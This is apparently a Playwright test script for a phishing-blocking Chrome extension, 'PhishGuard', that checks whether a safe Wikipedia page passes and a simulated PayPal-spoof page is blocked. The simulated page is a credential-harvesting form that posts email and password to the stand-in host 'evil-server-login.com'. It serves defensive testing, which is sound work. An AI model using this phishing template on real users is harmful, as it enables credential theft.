import os
from playwright.sync_api import sync_playwright

def intercept_phishing(route):
    html = """
    <html>
    <head><title>Secure Login Area - Action Required</title></head>
    <body style="padding: 50px; font-family: Arial;">
    <h1 style="color: red;">Account Locked</h1>
    <p>We noticed suspicious activity on your credit card. Please enter your password to recover your secure funds.</p>
    <form action="http://evil-server-login.com" method="POST">
        <input type="text" name="email" placeholder="Email Address">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Verify Now</button>
    </form>
    <p>Please click submit to verify your identify immediately.</p>
    </body>
    </html>
    """
    route.fulfill(status=200, content_type="text/html", body=html)

def main():
    extension_path = os.path.abspath("extension")
    artifact_dir = r"C:\Users\Aniruddh\.gemini\antigravity\brain\3bf6abee-a03c-4a37-9500-fc6f7f74bff7\artifacts"
    if not os.path.exists(artifact_dir):
        os.makedirs(artifact_dir, exist_ok=True)
    
    with sync_playwright() as p:
        print("[*] Launching Chromium with PhishGuard loaded natively...")
        browser = p.chromium.launch_persistent_context(
            user_data_dir=os.path.abspath("test_profile"),
            headless=False,
            args=[
                f"--disable-extensions-except={extension_path}",
                f"--load-extension={extension_path}",
            ],
            viewport={"width": 1280, "height": 720}
        )
        
        page = browser.pages[0] if browser.pages else browser.new_page()
        results = []
        
        # ── Test 1: Wikipedia (Legitimate) ──
        url1 = "https://en.wikipedia.org/wiki/Phishing"
        print(f"\n[*] Navigating to Safe Site: {url1}")
        page.goto(url1, wait_until="load")
        page.wait_for_timeout(3000) # Wait for DOM fetch + API prediction + UI inject latency
        
        is_blocked1 = page.evaluate("() => document.getElementById('phishguard-block-layer') !== null")
        img1 = os.path.join(artifact_dir, "test_safe.png")
        page.screenshot(path=img1)
        results.append({"url": url1, "blocked": is_blocked1, "expected": False, "img": img1})
        print(f"    -> Blocked: {is_blocked1} (Expected: False)")


        # ── Test 2: Spoofed Targeted Attack ──
        url2 = "http://paypal-secure-login-account-update.com/login"
        print(f"\n[*] Navigating to Simulated Attack Site: {url2}")
        # Route interception forces the browser to render our malicious payload when testing 
        page.route("**/*", intercept_phishing)
        
        page.goto(url2, wait_until="load")
        page.wait_for_timeout(3000) # Give API time to return PHISHING
        
        is_blocked2 = page.evaluate("() => document.getElementById('phishguard-block-layer') !== null")
        img2 = os.path.join(artifact_dir, "test_dangerous.png")
        page.screenshot(path=img2)
        results.append({"url": url2, "blocked": is_blocked2, "expected": True, "img": img2})
        print(f"    -> Blocked: {is_blocked2} (Expected: True)")
        
        browser.close()
        
        # ── Write Artifact Report ──
        md_file = os.path.join(artifact_dir, "real_world_tests.md")
        with open(md_file, "w", encoding="utf-8") as f:
            f.write("# 🧪 Real-World Automated Extension Testing\n\n")
            f.write("I ran Chromium dynamically loaded with the unpacking PhishGuard Chrome extension to see if it correctly interfaces with the FastAPI backend and halts dangerous activity!\n\n")
            
            for r in results:
                status = "✅ PASS" if r["blocked"] == r["expected"] else "❌ FAIL"
                f.write(f"## Testing: `{r['url']}`\n")
                f.write(f"- **Triggered full-page block:** {r['blocked']}\n")
                f.write(f"- **Expected to block:** {r['expected']}\n")
                f.write(f"- **Result:** {status}\n\n")
                # Format exactly as per instructions for artifacts
                f.write(f"![Extension Result]({r['img']})\n\n---\n")
                
        print(f"\n[+] Testing completed. Log saved to {md_file}")

if __name__ == "__main__":
    main()
